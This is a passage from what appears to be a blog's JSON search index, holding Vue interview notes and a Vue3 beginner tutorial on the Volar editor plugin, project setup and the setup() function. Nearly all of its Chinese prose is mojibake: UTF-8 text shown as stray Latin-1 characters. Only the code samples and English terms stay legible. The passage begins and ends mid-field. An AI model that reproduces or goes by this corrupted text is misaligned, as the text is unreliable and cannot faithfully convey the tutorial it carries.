è¨ˆç®—å±¬æ€§ã€‚ä¾è³´å…¶å®ƒå±¬æ€§å€¼ï¼Œä¸¦ä¸” computed çš„å€¼æœ‰ç·©å­˜ï¼Œåªæœ‰å®ƒä¾è³´çš„å±¬æ€§å€¼ç™¼ç”Ÿæ”¹è®Šï¼Œä¸‹ä¸€æ¬¡ç²å– computed çš„å€¼æ™‚æ‰æœƒé‡æ–°è¨ˆç®— computed çš„å€¼ watchï¼š ç›£è½æ•¸æ“šçš„è®ŠåŒ–ã€‚æ›´å¤šçš„æ˜¯ã€Œè§€å¯Ÿã€çš„ä½œç”¨ï¼Œé¡ä¼¼æ–¼æŸäº›æ•¸æ“šçš„ç›£è½å›èª¿ ï¼Œæ¯ç•¶ç›£è½çš„æ•¸æ“šè®ŠåŒ–æ™‚éƒ½æœƒåŸ·è¡Œå›èª¿é€²è¡Œå¾ŒçºŒæ“ä½œ é‹ç”¨å ´æ™¯ï¼š ç•¶æˆ‘å€‘éœ€è¦é€²è¡Œæ•¸å€¼è¨ˆç®—ï¼Œä¸¦ä¸”ä¾è³´æ–¼å…¶å®ƒæ•¸æ“šæ™‚ï¼Œæ‡‰è©²ä½¿ç”¨ computedï¼Œå› ç‚ºå¯ä»¥åˆ©ç”¨ computed çš„ç·©å­˜ç‰¹æ€§ï¼Œé¿å…æ¯æ¬¡ç²å–å€¼æ™‚ï¼Œéƒ½è¦é‡æ–°è¨ˆç®—ã€‚ ç•¶æˆ‘å€‘éœ€è¦åœ¨æ•¸æ“šè®ŠåŒ–æ™‚åŸ·è¡Œç•°æ­¥æˆ–é–‹éŠ·è¼ƒå¤§çš„æ“ä½œæ™‚ï¼Œæ‡‰è©²ä½¿ç”¨ watchï¼Œä½¿ç”¨ watch é¸é …å…è¨±æˆ‘å€‘åŸ·è¡Œç•°æ­¥æ“ä½œ ( è¨ªå•ä¸€å€‹ API )ï¼Œé™åˆ¶æˆ‘å€‘åŸ·è¡Œè©²æ“ä½œçš„é »ç‡ï¼Œä¸¦åœ¨æˆ‘å€‘å¾—åˆ°æœ€çµ‚çµæœå‰ï¼Œè¨­ç½®ä¸­é–“ç‹€æ…‹ã€‚é€™äº›éƒ½æ˜¯è¨ˆç®—å±¬æ€§ç„¡æ³•åšåˆ°çš„ã€‚ å¦‚ä½•ç†è§£è‡ªå®šç¾©æŒ‡ä»¤ï¼Ÿ æŒ‡ä»¤çš„å¯¦ç¾åŸç†ï¼Œå¯ä»¥å¾ç·¨è­¯åŸç† â¡ ä»£ç¢¼ç”Ÿæˆ â¡ æŒ‡ä»¤é‰¤å­å¯¦ç¾é€²è¡Œæ¦‚è¿° åœ¨ç”Ÿæˆ ast èªæ³•æ¨¹æ™‚ï¼Œé‡åˆ°æŒ‡ä»¤æœƒçµ¦ç•¶å‰å…ƒç´ æ·»åŠ directiveså±¬æ€§ é€šé genDirectives ç”ŸæˆæŒ‡ä»¤ä»£ç¢¼ åœ¨patchå‰å°‡æŒ‡ä»¤çš„é‰¤å­æå–åˆ° cbsä¸­ï¼Œåœ¨patchéç¨‹ä¸­èª¿ç”¨å°æ‡‰çš„é‰¤å­ ç•¶åŸ·è¡ŒæŒ‡ä»¤å°æ‡‰é‰¤å­å‡½æ•¸æ™‚ï¼Œèª¿ç”¨å°æ‡‰æŒ‡ä»¤å®šç¾©çš„æ–¹æ³• v-modelçš„åŸç†æ˜¯ä»€éº¼ï¼Ÿ v-modelæœ¬è³ªå°±æ˜¯ä¸€å€‹èªæ³•ç³–ï¼Œå¯ä»¥çœ‹æˆæ˜¯value + inputæ–¹æ³•çš„èªæ³•ç³–ã€‚å¯ä»¥é€šémodelå±¬æ€§çš„propå’Œeventå±¬æ€§ä¾†é€²è¡Œè‡ªå®šç¾©ã€‚åŸç”Ÿçš„v-modelï¼Œæœƒæ ¹æ“šæ¨™ç±¤çš„ä¸åŒç”Ÿæˆä¸åŒçš„äº‹ä»¶å’Œå±¬æ€§ã€‚ v-model åœ¨å…§éƒ¨ç‚ºä¸åŒçš„è¼¸å…¥å…ƒç´ ä½¿ç”¨ä¸åŒçš„å±¬æ€§ä¸¦æ‹‹å‡ºä¸åŒçš„äº‹ä»¶ï¼š text å’Œ textarea å…ƒç´ ä½¿ç”¨ value å±¬æ€§å’Œ input äº‹ä»¶ã€‚ checkbox å’Œ radio ä½¿ç”¨ checked å±¬æ€§å’Œ change äº‹ä»¶ã€‚ select å­—æ®µå°‡ value ä½œç‚º prop ä¸¦å°‡ change ä½œç‚ºäº‹ä»¶ã€‚ æ€§èƒ½å„ªåŒ–ç¯‡ Vueæ€§èƒ½å„ªåŒ– - ç·¨ç¢¼éšæ®µ ç›¡é‡æ¸›å°‘dataä¸­çš„æ•¸æ“šï¼Œdataä¸­çš„æ•¸æ“šéƒ½æœƒå¢åŠ getterå’Œsetterï¼Œæœƒæ”¶é›†å°æ‡‰çš„watcher å¦‚æœéœ€è¦ä½¿ç”¨v-forçµ¦æ¯é …å…ƒç´ ç¶å®šäº‹ä»¶æ™‚ä½¿ç”¨äº‹ä»¶ä»£ç† SPA é é¢æ¡ç”¨keep-aliveç·©å­˜çµ„ä»¶ åœ¨æ›´å¤šçš„æƒ…æ³ä¸‹ï¼Œä½¿ç”¨v-ifæ›¿ä»£v-show keyä¿è­‰å”¯ä¸€ ä½¿ç”¨è·¯ç”±æ‡¶åŠ è¼‰ã€ç•°æ­¥çµ„ä»¶ é˜²æŠ–ã€ç¯€æµ ç¬¬ä¸‰æ–¹æ¨¡å¡ŠæŒ‰éœ€å°å…¥ é•·åˆ—è¡¨æ»¾å‹•åˆ°å¯è¦–å€åŸŸå‹•æ…‹åŠ è¼‰ åœ–ç‰‡æ‡¶åŠ è¼‰ Vueæ€§èƒ½å„ªåŒ– - ç”¨æˆ¶é«”é©— éª¨æ¶å± PWA ä½¿ç”¨ç·©å­˜(å®¢æˆ¶ç«¯ç·©å­˜ã€æœå‹™ç«¯ç·©å­˜)å„ªåŒ–ã€æœå‹™ç«¯é–‹å•Ÿgzipå£“ç¸®ç­‰ Vueæ€§èƒ½å„ªåŒ– - SEOå„ªåŒ– é æ¸²æŸ“ æœå‹™ç«¯æ¸²æŸ“SSR Vueæ€§èƒ½å„ªåŒ– - æ‰“åŒ…å„ªåŒ– å£“ç¸®ä»£ç¢¼ Tree Shaking/Scope Hoisting ä½¿ç”¨cdnåŠ è¼‰ç¬¬ä¸‰æ–¹æ¨¡å¡Š å¤šç·šç¨‹æ‰“åŒ…happypack splitChunksæŠ½é›¢å…¬å…±æ–‡ä»¶ sourceMapå„ªåŒ– ","date":"2022-08-12T00:00:00Z","image":"https://live.staticflickr.com/65535/52282698225_df2b066743_o.jpg","permalink":"https://wayneblog.ga/2022-08-12/vue-interview-note/","title":"Vue åŸºæœ¬æ¦‚å¿µèˆ‡å¸¸è¦‹é¢è©¦é¡Œç­†è¨˜"},{"content":" æœ¬æ–‡é©åˆ Vue3 åˆå­¸è€…ï¼Œæˆ–è€… Vue2 é·ç§»è€…ï¼Œç•¶ç„¶é‚„æ˜¯å»ºè­° Vue3 å®˜ç¶²å®Œå…¨éä¸€éã€‚\nå…ˆæ¨è–¦å…©å€‹ vscode å¤–æ› Volar é¦–å…ˆæ¨è–¦ Volar ï¼Œä½¿ç”¨ vscode é–‹ç™¼ Vue å°ˆæ¡ˆçš„å°å¤¥ä¼´è‚¯å®šéƒ½èªè­˜ Vetur é€™å€‹ç¥ç´šå¤–æ›ï¼Œæœ‰äº†å®ƒå¯ä»¥è®“æˆ‘å€‘å¾—é–‹ç™¼å¦‚é­šå¾—æ°´ã€‚ é‚£éº¼ Volar å¯ä»¥ç†è§£ç‚º Vue3 ç‰ˆæœ¬çš„ Vetur ï¼Œç¨‹å¼ç¢¼é«˜äº®ï¼Œèªæ³•æç¤ºï¼ŒåŸºæœ¬ä¸Š Vetur æœ‰çš„å®ƒéƒ½æœ‰ã€‚\nåŠŸèƒ½ä¸€ï¼šå¤šå€‹æ ¹ç¯€é»ç·¨è­¯å™¨ä¸æœƒå ±éŒ¯ Vue3 æ˜¯å…è¨±æˆ‘å€‘æœ‰å¤šå€‹æ ¹ç¯€é»çš„ï¼Œä½†æ˜¯æˆ‘å€‘å¦‚æœä½¿ç”¨ Vetur å°±æœƒå ±éŒ¯ï¼Œä¸æœƒå½±éŸ¿åŸ·è¡Œï¼Œä½†æ˜¯çœ‹èµ·ä¾†å°±å¾ˆç…©ã€‚æ‰€ä»¥ç•¶æˆ‘å€‘è½‰å‘ Volarï¼Œé‚£éº¼å°±ä¸æœƒå‡ºç¾é€™å€‹å•é¡Œäº†ã€‚\nåŠŸèƒ½äºŒï¼šç·¨è¼¯å™¨åˆ†éš” å³ä¾¿ Vue çš„å…ƒä»¶åŒ–é–‹ç™¼ï¼Œå¯ä»¥å°‡å–®æª”æ¡ˆçš„ç¨‹å¼ç¢¼é•·åº¦å¤§å¹…ç¸®çŸ­ï¼Œä½†é‚„æ˜¯å‹•è¼’å¹¾ç™¾è¡Œç”šæ˜¯ä¸Šåƒè¡Œã€‚é‚£éº¼æˆ‘å€‘åˆ‡æ› templateã€scriptã€style çš„æ™‚å€™å°±è¦é »ç¹ä¸Šä¸‹ç¿»ï¼Œé›–ç„¶æœ‰çš„å¤–æ›å¯ä»¥ç›´æ¥å®šä½åˆ° cssï¼Œä½†æ˜¯ä½ å›ä¸å»å•Šï¼æ‰€ä»¥é€™å€‹åŠŸèƒ½ç°¡ç›´æ˜¯å¤ªäººæ€§åŒ–äº†ã€‚\nå®‰è£å®Œ Volar ä»¥å¾Œï¼Œé–‹å•Ÿä¸€å€‹ .vue æª”æ¡ˆï¼Œçœ‹ vscode çš„å³ä¸Šè§’ï¼Œæœ‰é€™éº¼ä¸€å€‹åœ–ç¤ºï¼Œé»ä¸€ä¸‹ã€‚\nå®ƒå°±æœƒè‡ªå‹•çµ¦ä½ åˆ†éš”æˆä¸‰å€‹é é¢ï¼Œåˆ†åˆ¥å°æ‡‰ templateã€scriptã€styleï¼Œé€™æ¨£å°±å¤ªèˆ’æœäº†æœ‰æ²’æœ‰ã€‚\né‚„æœ‰å¾ˆå¤šæ–°åŠŸèƒ½ï¼Œå¯ä»¥åƒè€ƒä¸‹é¢é€™ç¯‡æ–‡ç« ï¼š\nVolar - vueçµ‚æ¥µé–‹ç™¼ç¥å™¨ï¼\nåŠŸèƒ½ä¸‰ï¼šref sugar èªæ³•å¿«æ·æ”¹å‹•æ”¯æŒ ref sugar æ˜¯ä¸€å€‹é‚„åœ¨ rfc éšæ®µçš„åŠŸèƒ½ï¼Œä½†æ˜¯å·²ç¶“æŒçºŒå¾ˆä¹…äº†ï¼Œç¾åœ¨çš„ vue3 ç‰ˆæœ¬å·²ç¶“å¯ä»¥åšé®®ä½¿ç”¨äº†ã€‚å…·é«”çš„ç”¨æ³•ä»¥åŠèªæ³•æˆ‘å°±ä¸å±•é–‹è´…è¿°äº†ï¼Œæˆ‘ä¸»è¦èªªä¸€ä¸‹ Volar å’Œ ref sugar çš„çµåˆã€‚\nå ±éŒ¯å…ˆä¸ç®¡ï¼Œæ˜¯ eslint-plugin-vue çš„åŸå› ã€‚\nå¯ä»¥çœ‹åˆ°ï¼Œåœ¨ä½¿ç”¨äº† ref sugar ä¹‹å¾Œï¼Œscript ä¸Šé¢å‡ºç¾äº†ä¸€å€‹ ref sugar çš„å°åœ–æ¨™ï¼Œä¸¦ä¸”æ‰“äº†å€‹å°å‹¾ï¼Œé‚£éº¼æˆ‘å€‘é»ä¸€ä¸‹é‚£å€‹å°å‹¾ï¼Œçœ‹çœ‹æœƒç™¼ç”Ÿä»€éº¼ã€‚\nå¯ä»¥çœ‹åˆ°ï¼Œæˆ‘å€‘é»æ“Šé€™å€‹å°å°å‹¾ä¹‹å¾Œï¼Œå®ƒç”±åŸæœ¬çš„ ref sugar èªæ³•è®Šç‚ºäº†æ™®é€šçš„ script setup æ¨¡å¼ï¼Œé©šä¸é©šå–œï¼Œæ„ä¸æ„å¤–ã€‚\nåŠŸèƒ½å››ï¼šstyle è£¡é¢çš„ class å¼•ç”¨ å¯ä»¥çœ‹åˆ°ï¼Œåœ¨ .foo é€™å€‹é¡åä¸Šé¢ï¼Œå‡ºç¾äº†ä¸€å€‹ 1 reference çš„å°åœ–æ¨™ï¼Œä»£è¡¨è‘—ç•¶å‰ class æœ‰ä¸€æ¬¡å¼•ç”¨ï¼Œæˆ‘å€‘é»æ“Šä¸€ä¸‹é€™å€‹ 1 referenceã€‚\nå‡ºç¾äº†ä¸€å€‹å½ˆçª—ï¼Œè£¡é¢æ˜¯ç•¶å‰ class çš„å…·é«”ä½¿ç”¨ä½ç½®ã€‚\nåŠŸèƒ½äº”ï¼šclass è¿½æœ” æˆ‘å€‘å‰µå»ºä¸€å€‹ template æ ¹å…ƒç´ ï¼Œåœ¨è£¡é¢å¯«å…¥ï¼š\nsample.vue 1 2 3 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;foo\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; åœ¨ style ä¸­å¯«å…¥ï¼š\nsample.vue 1 2 3 \u0026lt;style scoped\u0026gt; .foo {} \u0026lt;/style\u0026gt; é™¤äº† style ä¸­çš„ .foo ä¸Šé¢æœƒå‡ºç¾ 1 reference çš„å°åœ–æ¨™ä¹‹å¤–ï¼Œåœ¨ class=\u0026quot;foo\u0026quot; çš„ foo ä¸‹é¢ï¼Œæœƒå‡ºç¾ä¸€é“æ©«ç·šã€‚\nå°æ–¼ç¶“å¸¸ä½¿ç”¨ vscode çš„é–‹ç™¼äººå“¡ä¾†èªªï¼Œé€™ä»£è¡¨ä»€éº¼æ„ç¾©å°±ä¸å¿…å¤šèªªäº†ï¼Œæˆ‘å€‘æ ¹æ“šæç¤ºï¼ŒæŒ‰ä½ ctrl(command) ç„¶å¾Œé»æ“Šï¼Œæœƒç™¼ç¾å…‰æ¨™è‡ªå·±ç§»å‹•åˆ°äº† style ä¸­çš„ .foo ä¹‹å‰ï¼Œå“‡! awesome!\nåŠŸèƒ½å…­ï¼šcss module é¡å‹æç¤º css module ä¸€èˆ¬æ˜¯ react æŠ€è¡“æ£§ç”¨çš„æœƒæ¯”è¼ƒå¤šä¸€äº›ï¼Œå°±æˆ‘å€‹äººä¾†èªªï¼Œæ˜¯å¾æ²’åœ¨ vue è£¡é¢ä½¿ç”¨å®ƒçš„ï¼Œå› ç‚º vue æä¾›äº† scoped ä½œç”¨åŸŸï¼Œä¸ç”¨æ“”å¿ƒæ¨£å¼è¡çªï¼Œç›´æ¥ä½¿ç”¨é è™•ç†å™¨æœƒæ›´åŠ ç°¡å–®æ–¹ä¾¿ã€‚\næˆ‘å€‘å‰µå»ºå¦‚ä¸‹ä»£ç¢¼ï¼š\nsample.vue 1 2 3 4 5 6 7 \u0026lt;template\u0026gt; \u0026lt;div :class=\u0026#34;$style.foo\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;style module\u0026gt; .foo { } \u0026lt;/style\u0026gt; ç„¶å¾Œå°‡é¼ æ¨™ç§»å‹•åˆ° $style ä¸Š\næœ‰é»æ„æ€ï¼Œçœ‹ä¾† vscode æ˜¯è®“ Volar ç©æ˜ç™½äº†ã€‚\nåŠŸèƒ½ä¸ƒï¼šlang èªæ³•æç¤º vue å¯ä»¥ä½¿ç”¨ lang å±¬æ€§ä¾†é¸æ“‡ä½¿ç”¨çš„èªè¨€ï¼Œæ¯”å¦‚ template ä¸­çš„ html/pugã€script ä¸­çš„ tsã€style ä¸­çš„ scss ç­‰ã€‚\nä½†æ˜¯åœ¨ä»¥å‰ï¼Œæˆ‘å€‘éƒ½æ˜¯æ‰‹å‹•è¼¸å…¥çš„ï¼Œç·¨è¼¯å™¨ï¼Œæˆ–è€…èªª Vetur ä¸¦æ²’æœ‰çµ¦æˆ‘å€‘æä¾›ä»»ä½•æç¤ºï¼Œæœ‰å¯èƒ½ä½ æ‰¾äº†å¾ˆä¹…çš„è«åå…¶å¦™çš„å•é¡Œï¼Œå°±æ˜¯å› ç‚º lang å¯«éŒ¯äº†ã€‚\nä½†æ˜¯é€™ä¸€åˆ‡ï¼Œåœ¨æœ‰äº† Volar ä¹‹å¾Œï¼Œéƒ½ä¸åŒäº†ã€‚\nåŠŸèƒ½å…«ï¼štemplate èªæ³•è½‰æ› vue é»˜èªæä¾›äº†å…©ç¨®æ¨¡æ¿ä¾›æˆ‘å€‘ä½¿ç”¨ï¼Œä½†æ˜¯ä¸€èˆ¬éƒ½æœƒä½¿ç”¨ htmlï¼Œå¦å¤–ä¸€ç¨®å«åš pugã€‚\nç›¸å°æ–¼ htmlï¼Œpug æ›´åå‘æ–¼ yml é‚£ç¨®ï¼Œç°¡æ½”ç¨‹åº¦ç‰¹åˆ¥é«˜ã€‚\nåœ¨ Volar ä¸­ï¼Œç‚ºæˆ‘å€‘æä¾›äº† html å’Œ pug äº’ç›¸è½‰æ›çš„åŠŸèƒ½ã€‚\nsample.vue 1 2 3 4 5 6 7 8 9 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;li\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt; \u0026lt;img /\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; åœ¨æˆ‘å€‘æ›¸å¯« template ä¹‹å¾Œï¼Œtemplate é ‚éƒ¨æœƒå‡ºç¾ä¸€å€‹å°å°çš„ pug åœ–æ¨™ï¼Œæˆ‘å€‘å¯ä»¥çœ‹åˆ°æ­¤æ™‚å®ƒæ˜¯æ²’æœ‰è¢«é¸ä¸­çš„ã€‚\né€™å€‹æ™‚å€™æˆ‘å€‘é»æ“Šä¸€ä¸‹é€™å€‹åœ–æ¨™ï¼Œè®“å®ƒé¸ä¸­ï¼Œç¥å¥‡çš„äº‹æƒ…ç™¼ç”Ÿäº†ã€‚\næˆ‘å€‘å¯«å¥½çš„ html æ¨¡æ¿ï¼Œè¢«è‡ªå‹•è½‰åŒ–æˆäº† pugï¼Œå†é»æ“Šä¸€ä¸‹ï¼Œåˆå›åˆ°äº†æˆ‘å€‘ç†Ÿæ‚‰çš„ htmlã€‚\nå¾åŠŸèƒ½ä¸‰é–‹å§‹ï¼ŒåŸºæœ¬éƒ½æ˜¯ç®—å…§æ¸¬çš„æ–°åŠŸèƒ½ï¼Œæˆ‘æ˜¯æ©Ÿç·£å·§åˆä¹‹ä¸‹ï¼Œå°‡ Volar ä¸‹åˆ°æœ¬åœ°é€²è¡ŒæŸ¥çœ‹çš„æ™‚å€™ç™¼ç¾çš„é€™äº›ã€‚æƒ³åšé®®çš„å¯ä»¥è‡ªå·±ä¸‹è¼‰æºç¢¼ï¼Œç„¶å¾Œåœ¨packages/vscode-vue-languageservice/testCasesç›®éŒ„ä¸‹é«”é©—ï¼Œå¸Œæœ›é€™äº›åŠŸèƒ½å¯ä»¥ç›¡å¿«ç™¼å¸ƒï¼\nVue 3 Snippets æ¨è–¦çš„ç¬¬äºŒå€‹å¤–æ›å«åš Vue 3 Snippets ï¼ŒåŒæ¨£çš„ï¼Œä»–ä¹Ÿæœ‰è‡ªå·±çš„ Vue2 ç‰ˆæœ¬ã€‚å®ƒæ˜¯å¹¹ä»€éº¼çš„å‘¢ï¼Œå¯ä»¥çœ‹ä¸€ä¸‹ä¸‹é¢é€™å¼µåœ–ï¼Œæˆ‘åªè¼¸å…¥äº† \u0026quot;v3\u0026quot; ï¼Œå®ƒæœ‰å¾ˆå¤šæç¤ºï¼Œæˆ‘å€‘å°±å…ˆé¸æ“‡ v3computed ï¼Œé¸ä¸­ Enter å³å¯ã€‚\nç„¶å¾Œå®ƒå°±çµ¦æˆ‘å€‘è‡ªå‹•å¯«äº†å¦‚ä¸‹ç¨‹å¼ç¢¼ï¼š\næ˜¯ä¸æ˜¯è¶…ç´šçœäº‹ï¼Œæ‘¸é­šçš„æ™‚é–“åˆå¢åŠ äº†ï¼é‚„æœ‰æ›´å¤šæœ‰è¶£çš„ä½¿ç”¨æ–¹å¼ï¼Œå°å¤¥ä¼´å€‘è‡ªè¡Œæ¢ç´¢å§ã€‚\nå»ºç«‹ Vue3 å°ˆæ¡ˆ é‚£éº¼æ­£å¼é–‹å§‹å­¸ç¿’æˆ‘å€‘çš„ Vue3 ï¼Œå…ˆå¾å»ºç«‹å°ˆæ¡ˆé–‹å§‹ã€‚\nä½¿ç”¨ vue-cli å»ºç«‹ è¼¸å…¥ä¸‹é¢çš„å‘½ä»¤ç„¶å¾Œé¸æ“‡é…ç½®é …é€²è¡Œå®‰è£å³å¯ï¼Œé€™è£¡æ³¨æ„ vue-cli çš„ç‰ˆæœ¬ä¸€å®šè¦åœ¨ ==4.5.0== ä»¥ä¸Šã€‚\n1 2 3 4 5 6 7 8 ### å®‰è£æˆ–è€…å‡ç´š npm install -g @vue/cli ### æª¢è¦–ç‰ˆæœ¬ ä¿è­‰ vue cli ç‰ˆæœ¬åœ¨ 4.5.0 ä»¥ä¸Š vue --version ### å»ºç«‹å°ˆæ¡ˆ vue create my-project ### ç„¶å¾Œæ ¹æ“šæç¤ºä¸€æ­¥ä¸€æ­¥å‚»ç“œå¼æ“ä½œå°±è¡Œäº† ### ... ä½¿ç”¨ Vite å»ºç«‹ éƒ½èªª Vue3.0 å’Œ Vite2 æ›´é…ï¼Œå„ç¨®å„ªåŒ–å„ç¨®å¿«ï¼Œä½†éƒ½ä¸å±¬æ–¼æœ¬æ–‡çš„å…§å®¹ï¼Œæœ¬æ–‡çš„ç›®çš„æˆ‘å€‘åªéœ€è¦çŸ¥é“å®ƒç‰¹åˆ¥å¥½ç”¨ã€æ€éº¼ç”¨å°±è¡Œäº†ã€‚æˆ‘é€™è£¡æ˜¯å¤šé¸æ“‡äº† TSï¼Œæ¯è¡Œéƒ½æœ‰è¨»é‡‹ï¼Œä¸€ç›®ç­ç„¶ã€‚\n1 2 3 4 5 6 7 8 ### åˆå§‹åŒ– viete å°ˆæ¡ˆ npm init vite-app \u0026lt;project-name\u0026gt; ### é€²å…¥å°ˆæ¡ˆè³‡æ–™å¤¾ cd \u0026lt;project-name\u0026gt; ### å®‰è£ä¾è³´ npm install ### å•Ÿå‹•å°ˆæ¡ˆ npm run dev å»ºç«‹å®Œä»¥å¾Œæˆ‘å€‘å…ˆä¾†çœ‹çœ‹å…¥å£æª”æ¡ˆ main.ts\nmain.ts 1 2 3 4 5 6 // å¼•å…¥ createApp å‡½å¼ï¼Œå»ºç«‹å°æ‡‰çš„æ‡‰ç”¨ï¼Œç”¢ç”Ÿæ‡‰ç”¨çš„ä¾‹é …ç‰©ä»¶ import { createApp } from \u0026#39;vue\u0026#39;; // å¼•å…¥ app å…ƒä»¶ (æ‰€æœ‰å…ƒä»¶çš„çˆ¶ç´šå…ƒä»¶) import App from \u0026#39;./App.vue\u0026#39;; // å»ºç«‹ app æ‡‰ç”¨è¿”å›å°æ‡‰çš„ä¾‹é …ç‰©ä»¶ï¼Œå‘¼å« mount æ–¹æ³•é€²è¡Œæ›è¼‰ï¼Œæ›è¼‰åˆ° #app ç¯€é»ä¸Šå» createApp(App).mount(\u0026#39;#app\u0026#39;); ç„¶å¾Œçœ‹çœ‹æ ¹å…ƒä»¶ app.vue\napp.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \u0026lt;!-- Vue2 å…ƒä»¶ä¸­çš„ html æ¨¡æ¿ä¸­å¿…é ˆè¦æœ‰ä¸€å°æ ¹æ¨™ç±¤ï¼ŒVue3 å…ƒä»¶çš„ html æ¨¡æ¿ä¸­å¯ä»¥æ²’æœ‰æ ¹æ¨™ç±¤ --\u0026gt; \u0026lt;template\u0026gt; \u0026lt;img alt=\u0026#34;Vue logo\u0026#34; src=\u0026#34;./assets/logo.png\u0026#34;\u0026gt; \u0026lt;!-- ä½¿ç”¨å­ç´šå…ƒä»¶ --\u0026gt; \u0026lt;HelloWorld msg=\u0026#34;Welcome to Your Vue.js + TypeScript App\u0026#34; /\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#34;ts\u0026#34;\u0026gt; // é€™è£¡å¯ä»¥æ›¸å¯« TS ç¨‹å¼ç¢¼ // defineComponent å‡½å¼ï¼Œç›®çš„æ˜¯å®šç¾©ä¸€å€‹å…ƒä»¶ï¼Œå…§éƒ¨å¯ä»¥å‚³å…¥ä¸€å€‹é…ç½®ç‰©ä»¶ import { defineComponent } from \u0026#39;vue\u0026#39;; // å¼•å…¥å­ç´šå…ƒä»¶ import HelloWorld from \u0026#39;./components/HelloWorld.vue\u0026#39;; // æš´éœ²å‡ºå»ä¸€å€‹å®šç¾©å¥½çš„å…ƒä»¶ export default defineComponent({ // ç•¶å‰å…ƒä»¶çš„åå­— name: \u0026#39;App\u0026#39;, // è¨»å†Šå…ƒä»¶ components: { // è¨»å†Šä¸€å€‹å­ç´šå…ƒä»¶ HelloWorld, }, }); \u0026lt;/script\u0026gt; Composition API æ¥ä¸‹ä¾†åˆ°äº†é‡é ­æˆ²ï¼ŒVue3 çš„æ‹›ç‰Œç‰¹æ€§ï¼ŒComposition APIã€‚\né—œæ–¼ Composition API é€™è£¡æœ‰åœ–è§£æ¼”ç¤ºï¼Œæ¥µåŠ›æ¨è–¦ã€‚\nåœ–è§£ Option API vs Composition API\nComposition API å¯ä»¥æ›´æ–¹ä¾¿çš„æŠ½å–å…±é€šé‚è¼¯ï¼Œä½†æ˜¯ä¸è¦éæ–¼åœ¨æ„é‚è¼¯ç¨‹å¼ç¢¼è¤‡ç”¨ï¼Œä»¥åŠŸèƒ½æå–ç¨‹å¼ç¢¼ä¹Ÿæ˜¯ä¸€ç¨®æ€è·¯ã€‚ é †ä¾¿æä¸€å¥ï¼ŒVue3 ç›¸å®¹å¤§éƒ¨åˆ† Vue2 èªæ³•ï¼Œæ‰€ä»¥åœ¨ Vue3 ä¸­æ›¸å¯« Vue2 èªæ³•æ˜¯æ²’æœ‰å•é¡Œçš„ï¼ˆå»¢é™¤çš„é™¤å¤–ï¼‰ï¼Œä½†æ˜¯æ—¢ç„¶æˆ‘å€‘å·²ç¶“å‡ç´š Vue3 äº†ï¼Œä¸å»ºè­°æ··åˆä½¿ç”¨ï¼Œé™¤éä¸€äº›å¤§å‹ç‰¹æ®Šå°ˆæ¡ˆéœ€è¦ç›¸å®¹å…©å€‹ç‰ˆæœ¬ã€‚\nç”Ÿå‘½é€±æœŸé‰¤å­ setup setup æ˜¯çµ„åˆ Composition API ä¸­çš„å…¥å£å‡½å¼ï¼Œä¹Ÿæ˜¯ç¬¬ä¸€å€‹è¦ä½¿ç”¨çš„å‡½å¼ã€‚ setup åªåœ¨åˆå§‹åŒ–æ™‚åŸ·è¡Œä¸€æ¬¡ï¼Œæ‰€æœ‰çš„ Composition API å‡½å¼éƒ½åœ¨æ­¤ä½¿ç”¨ã€‚ 1 2 3 setup() { console.log(\u0026#39;æˆ‘åŸ·è¡Œäº†\u0026#39;) // æˆ‘åŸ·è¡Œäº† }, å¯ä»¥é€šé console.log çœ‹åˆ° setup æ˜¯åœ¨ beforeCreate ç”Ÿå‘½é€±æœŸä¹‹å‰åŸ·è¡Œçš„(åªåŸ·è¡Œä¸€æ¬¡)ï¼š\n1 2 3 4 5 6 7 8 9 beforeCreate() { console.log(\u0026#39;beforeCreateåŸ·è¡Œäº†\u0026#39;); }, setup() { console.log(\u0026#39;setupåŸ·è¡Œäº†\u0026#39;); return {}; }, // setupåŸ·è¡Œäº† // beforeCreateåŸ·è¡Œäº† ç”±æ­¤å¯ä»¥æ¨æ–·å‡º setup åŸ·è¡Œçš„æ™‚å€™ï¼Œå…ƒä»¶ç‰©ä»¶é‚„æ²’æœ‰å»ºç«‹ï¼Œå…ƒä»¶å¯¦ä¾‹ç‰©ä»¶ this é‚„ä¸å¯ç”¨ï¼Œæ­¤æ™‚ this æ˜¯ undefinedï¼Œä¸èƒ½é€šé this ä¾†è¨ªå• dataã€computedã€methodsã€propsã€‚ è¿”å›ç‰©ä»¶ä¸­çš„^1.^å±¬æ€§æœƒèˆ‡ data å‡½å¼è¿”å›ç‰©ä»¶çš„å±¬æ€§åˆä½µæˆç‚ºå…ƒä»¶ç‰©ä»¶çš„å±¬æ€§ï¼›^2.^è¿”å›ç‰©ä»¶ä¸­çš„æ–¹æ³•æœƒèˆ‡ methods ä¸­çš„æ–¹æ³•åˆä½µæˆåŠŸå…ƒä»¶ç‰©ä»¶çš„æ–¹æ³•ã€‚ å¦‚æœæœ‰é‡åï¼Œsetup å„ªå…ˆã€‚å› ç‚ºåœ¨ setup ä¸­ this ä¸å¯ç”¨ï¼Œmethods ä¸­å¯ä»¥è¨ªå• setup æä¾›çš„å±¬æ€§å’Œæ–¹æ³•ï¼Œä½†åœ¨ setup æ–¹æ³•ä¸­ä¸èƒ½è¨ªå• data å’Œ methods è£¡çš„å…§å®¹ï¼Œæ‰€ä»¥é‚„æ˜¯ä¸å»ºè­°æ··åˆä½¿ç”¨ã€‚ setup å‡½å¼å¦‚æœè¿”å›ç‰©ä»¶ï¼Œç‰©ä»¶ä¸­çš„å±¬æ€§æˆ–æ–¹æ³•ï¼Œtemplate ä¸­å¯ä»¥ç›´æ¥ä½¿ç”¨ã€‚ sample.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt;{{number}}\u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; // ... setup() { const number = 18; return { number, }; }, // ... \u0026lt;/script\u0026gt; æ³¨æ„ï¼šsetup 